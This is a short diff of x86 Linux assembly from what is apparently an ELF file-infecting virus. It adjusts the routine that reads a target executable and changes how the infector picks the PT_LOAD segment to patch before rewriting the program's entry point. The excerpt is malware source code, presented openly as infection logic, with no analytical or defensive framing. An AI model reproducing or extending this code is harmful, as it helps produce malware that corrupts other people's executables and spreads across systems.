@@ -166,11 +166,11 @@ start_infect:
     int 80h
 
 ;read the elf target we have saved to edi+2080
-read_content:               
-    mov eax, 3              ; sys_read
     mov ebx, eax            ; fd
     mov ecx, edi
-    add ecx, 2080           ; edi+2080
+    add ecx, 2080           ; ecx = edi + 2080
+read_content:               
+    mov eax, 3              ; sys_read
     mov edx, 1              ; read 1 byte everytime
     int 80h
 
@@ -216,8 +216,8 @@ program_header_loop:
     jne program_header_loop             ; not PT_LOAD, look for next program header
 
     mov ebx, dword [edi+2080+eax+4]     ; p_offset
-    cmp ebx, 0x2bf00                    ; imply it is a Data segment
-    jne program_header_loop             ; not Data segment, look for next program header
+    cmp ebx, 0x00                    	; imply it is a Text segment
+    je program_header_loop             	; not a data segment, look for next program header
 
     ; change entry point
     mov ebx, dword [edi+2080+24]        ; old entry point
